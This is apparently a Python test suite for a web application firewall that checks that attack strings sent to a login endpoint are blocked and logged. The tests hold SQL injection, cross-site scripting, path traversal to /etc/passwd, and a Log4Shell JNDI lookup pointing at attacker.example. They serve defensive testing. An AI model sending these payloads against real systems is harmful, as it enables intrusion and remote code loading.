from app.storage import repository
from app.storage.db import get_connection


def test_sqli_in_query_blocked(client):
    response = client.get("/login", params={"id": "' OR '1'='1"})
    assert response.status_code == 403
    assert "Blocked" in response.text


def test_xss_in_query_blocked(client):
    response = client.get("/login", params={"q": "<script>alert(1)</script>"})
    assert response.status_code == 403


def test_path_traversal_blocked(client):
    response = client.get("/login", params={"file": "../../etc/passwd"})
    assert response.status_code == 403


def test_jndi_query_blocked_and_categorized_as_log4shell_not_ssti(client):
    response = client.get("/login", params={"q": "${jndi:ldap://attacker.example/a}"})
    assert response.status_code == 403
    # block_id is rendered as "Reference: waf-<category>-<timestamp>" --
    # confirms the dedicated log4shell category wins over the generic
    # ${...} ssti pattern it would otherwise be miscategorized as.
    assert "waf-log4shell-" in response.text
    assert "waf-ssti-" not in response.text


def test_normal_request_not_blocked(client):
    response = client.get("/login")
    assert response.status_code == 200


def test_canary_callback_never_blocked_even_with_attack_like_token(client):
    response = client.get(
        "/api/internal/callback/' OR '1'='1", params={"x": "<script>alert(1)</script>"}
    )
    assert response.status_code == 204


def test_beacon_never_blocked_even_with_attack_like_token(client):
    response = client.get("/api/internal/beacon/' OR '1'='1")
    assert response.status_code == 204


def test_blocked_request_persisted_with_waf_triggered_and_bumps_bot_score(client):
    response = client.get("/login", params={"id": "' OR '1'='1"})
    assert response.status_code == 403

    conn = get_connection()
    rows = conn.execute("SELECT * FROM events WHERE waf_triggered = 1").fetchall()
    assert len(rows) == 1
    assert rows[0]["status_code"] == 403

    sessions = repository.list_sessions()
    assert len(sessions) == 1
    assert sessions[0]["bot_score"] >= 2.5


def test_console_toggle_disables_and_reenables_blocking(client):
    repository.set_config("waf_enabled", "off")
    response = client.get("/login", params={"id": "' OR '1'='1"})
    assert response.status_code == 200

    repository.set_config("waf_enabled", "on")
    response = client.get("/login", params={"id": "' OR '1'='1"})
    assert response.status_code == 403
